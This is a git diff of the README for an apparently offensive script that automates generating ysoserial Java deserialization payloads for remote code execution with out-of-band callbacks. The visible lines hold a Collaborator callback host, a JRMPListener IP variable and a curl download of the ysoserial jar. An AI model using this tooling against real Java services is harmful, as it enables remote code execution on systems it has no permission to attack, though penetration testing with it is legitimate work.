@@ -1,5 +1,7 @@
 # java-insecure-deserialization
-
+<p align="center">
+  <img width="460" height="300" src="https://github.com/nowak0x01/java-insecure-deserialization/assets/96009982/aaa3a093-5026-4250-8232-f23cab3b10a8">
+</p>
 This script automatically generates all payloads available in Ysoserial https://github.com/frohoff/ysoserial that lead to Remote code execution (RCE), using Out of Band techniques
 
 Note: Payloads that could not be automated. <i>AspectJWeaver, FileUpload1, JSON1, Jython1</i> and <i>Wicket1</i>
@@ -10,6 +12,7 @@ Collaborator="hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com"
 IP="" # for JRMPListener payload
 Encoding="base64 -w0"
 
+export TERM="xterm"
 clear
 printf "\n\e[1;37m[#]\e[0m Downloading latest ysoserial release \e[1;37m[#]\e[0m\n\n"
 curl -LkO https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar && printf "\n\e[1;37m[#]\e[0m Download Completed! \e[1;37m[#]\e[0m\n"
